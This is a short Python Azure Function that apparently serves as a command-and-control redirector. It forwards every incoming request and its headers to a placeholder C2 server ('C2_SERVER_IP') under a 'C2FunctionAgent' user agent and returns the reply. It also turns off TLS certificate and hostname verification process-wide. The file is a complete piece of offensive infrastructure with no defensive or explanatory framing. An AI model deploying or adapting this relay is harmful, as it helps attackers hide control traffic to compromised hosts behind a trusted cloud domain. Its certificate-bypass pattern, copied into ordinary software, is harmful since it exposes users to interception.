import ssl
import logging
import urllib.parse
import urllib.request
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    url = 'https://C2_SERVER_IP/api/users/1000/GetIt'
    header_dict = {}
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ssl._create_default_https_context = ssl._create_unverified_context

    for key, value in dict(req.headers).items():
        header_dict.update({key : value})

    header_dict.update({'User-Agent': 'C2FunctionAgent'})

    request = urllib.request.Request(url, headers=header_dict)
    with urllib.request.urlopen(request, context=ctx) as response:
        html = response.read()
    return func.HttpResponse(html)
